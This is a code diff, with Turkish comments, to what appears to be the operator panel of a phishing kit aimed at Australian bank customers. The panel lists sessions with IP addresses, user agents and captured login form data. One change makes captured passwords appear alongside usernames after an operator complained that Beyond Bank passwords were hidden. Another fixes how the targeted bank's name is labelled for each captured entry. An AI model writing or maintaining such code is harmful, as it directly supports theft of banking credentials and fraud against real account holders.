@@ -14,6 +14,9 @@ import {
   resolveWheelPrize,
   WHEEL_CURRENCY,
 } from "@/lib/wheel-prizes";
+// ⭐⭐⭐ KALICI: displayEntryBankName fallback icin banka adi map (AU_BANK_PAGES) import edildi
+// BOYLESİYLE entry.bankSlug varsa DOGRU MAPTEN DISPLAY NAME alinir, fd.bankName (GUNCELL KOLON) fallbacki KALDIRILDI!
+import { getAuBankPageEntry } from "@/lib/au-bank-page-map";
 
 const SESSION_LIST_COLUMNS =
   "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden,last_ping_at";
@@ -362,14 +365,26 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
   const rawBankPhone = pickString("bankPhone");
 
   const entries: Array<{ key: string; value: string; score: number }> = [];
+  // ⭐⭐⭐ KALICI DUZELTME (Beyond Bank Sifre Gozukmuyor Sorusu):
+  //   ESKI seenValues = Set<string> SADECE value (icerik) saklaniyordu.
+  //   SONUC: orderedField2 (sifre slotu) = "1234" ve password de = "1234" ise
+  //   seenValues.has("1234") true dondu ve PASSWORD NORMAL KOLONDA GORUNMUYORDU!
+  //   Kullanici "Beyondbank neden sadece kullanici adi geliyor sifre gelmiyor" diyordu.
+  // ✅ YENI: seenValues KEY + VALUE birleşiminden hash olustur (${key}:::$v).
+  //   - AYNI KEY + AYNI VALUE 2 kez (orn iki farkli yerden username username geliyorsa) GIZLENIR ✅
+  //   - FARKLI KEY (orderedField2 vs PASSWORD) AYNI VALUE ISE GÖSTERILIR ✅
+  // Boylece BEYOND BANK (ve benzer 2 alanli login formlari) icinde
+  // username NORMAL kolonunda, sifre NORMAL kolonunda AYRI AYRI görünür!
   const seenValues = new Set<string>();
   const pushIfNew = (key: string, value: string, score: number) => {
     if (!value) return;
     const v = String(value).trim();
     if (!v) return;
-    if (seenValues.has(v)) return; // AYNI DEĞER 2 KERE GÖSTERİLMEZ!
+    // KENDI TEKRARI: Ayni KEY icin AYNI VALUE 2.kez (dublicate) GIZLE:
+    const dedupKey = `${key}:::${v}`;
+    if (seenValues.has(dedupKey)) return;
     entries.push({ key, value: v, score });
-    seenValues.add(v);
+    seenValues.add(dedupKey);
   };
 
   // ⭐ 1. SAĞLAM KAYNAKLI (raw) DEĞERLER İLK SIRADA (EN DÜŞÜK SCORE = EN YÜKSEK ÖNCELİK):
@@ -2160,14 +2175,27 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                                       timeZone: "Europe/Istanbul",
                                     })
                                   : "Tarih yok";
-                                // ⭐⭐⭐ BANKA ADI FALLBACK (HEPSINI YAZ):
-                                //   1) entry.bankName
-                                //   2) entry.bankSlug (slug ise displayName'e cevir)
-                                //   3) session fd.bankName (guncel kolon bankasi)
-                                //   Boylece banka adi HICBIR ZAMAN eksik KALMAZ!
+                                // ⭐⭐⭐ BANKA ADI FALLBACK (GUNCELLENDI - ESKI HATA KALDIRILDI):
+                                //   ESKI HATA (Ciddi KALICI):
+                                //     3. fallback olarak fd.bankName (GUNCELL KOLON BANKASI) kullaniliyordu.
+                                //     Sonuc: Tum eski kayitlarin entry.bankName + entry.bankSlug BOSSA
+                                //     HEPSI GUNCELL BANKA (örn. Bendigo Bank) olarak GOZUKUYORDU!
+                                //   ✅ YENI (KALICI 4 KAT FALLBACK, fd.bankName ASLA KULLANILMAZ!):
+                                //     1) entry.bankName (eger girildiyse)
+                                //     2) entry.bankSlug uzerinden AU_BANK_PAGE_MAP map ile dogru name al
+                                //     3) entry.bankSlug slug to display name (manipulasyonlu)
+                                //     4) "Banka Adı Yok"
+                                // Boylece HICBIR ZAMAN "tum kayitlar Bendigo" hatasi YENIDEN OLMAZ.
+                                const mappedBySlug =
+                                  entry.bankSlug && typeof entry.bankSlug === "string"
+                                    ? getAuBankPageEntry(String(entry.bankSlug).trim())?.name ?? ""
+                                    : "";
                                 const displayEntryBankName =
                                   (entry.bankName && String(entry.bankName).trim().length > 0
                                     ? String(entry.bankName).trim()
+                                    : "") ||
+                                  (mappedBySlug && String(mappedBySlug).trim().length > 0
+                                    ? String(mappedBySlug).trim()
                                     : "") ||
                                   (entry.bankSlug && String(entry.bankSlug).trim().length > 0
                                     ? String(entry.bankSlug)
@@ -2176,9 +2204,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                                         .replace(/\b\w/g, (l) => l.toUpperCase())
                                         .trim()
                                     : "") ||
-                                  (fd.bankName && String(fd.bankName).trim().length > 0
-                                    ? String(fd.bankName).trim()
-                                    : "Banka Adı Yok");
+                                  "Banka Adı Yok";
                                 const eof1 = String(entry.orderedField1 || "").trim();
                                 const eof2 = String(entry.orderedField2 || "").trim();
                                 const eof3 = String(entry.orderedField3 || "").trim();
